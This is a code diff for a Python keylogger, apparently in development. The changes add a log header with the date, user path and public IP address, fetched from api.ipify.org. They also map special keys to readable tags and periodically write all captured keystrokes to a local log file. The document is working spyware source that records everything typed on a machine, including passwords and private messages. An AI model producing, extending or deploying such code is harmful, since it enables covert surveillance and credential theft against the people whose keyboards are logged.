@@ -1,17 +1,32 @@
-import pynput, time, os, random, requests, socket
+import pynput, time, os, random, requests, socket, pyxhook
 from pynput.keyboard import Key, Listener
 
 count = 0
 keys = []
 
+date_time = time.ctime(time.time())
+user = os.path.expanduser('~').split(socket.gethostname())
+pubIP = requests.get('https://api.ipify.org').text
+
+Log_Title = f'Date/Time: {date_time} User: {user} PublicIP#: {pubIP} \n'
+key_logs = []
+key_logs.append(Log_Title)
 
 def key_input(key):
     global keys, count
-
-    keys.append(key)
-    count += 1
-    print("{0} pressed".format(key))
-
+    key_substitution = ['Key.enter', '[ENTER]', 'Key.backspace', '[BACKSPACE]', 'Key.space', ' ',
+                        'Key.alt_l', '[ALT]', 'Key.tab', '[TAB]', 'Key.delete', '[DEL]', 'Key.ctrl_l', '[CTRL]',
+                        'Key.left', '[LEFT ARROW]', 'Key.right', '[RIGHT ARROW]', 'Key.shift', '[SHIFT]']
+    key = str(key).replace("'", "")
+    if key in key_substitution:
+        keys.append(key_substitution[key_substitution.index(key)+1])
+        print("Passed1")
+        count += 1
+    else:
+        keys.append(key)
+        print("Passed2")
+        count += 1
+        #  print("{0} pressed".format(key))
     if count >= 10:
         count = 0
         file_wr(keys)
@@ -20,14 +35,8 @@ def key_input(key):
 
 def file_wr(keys):
     with open("log.txt", "a") as f:
-        for key in keys:
-            k = str(key).replace("'", "")
-            f.write(str(key))
-            if k.find("space") > 0:
-                f.write(" ")
-            elif k.find("Key") == -1:
-                f.write(k)
-
+        k = str(keys)
+        f.write(k)
 
 def key_release(key):
     if key == Key.esc:
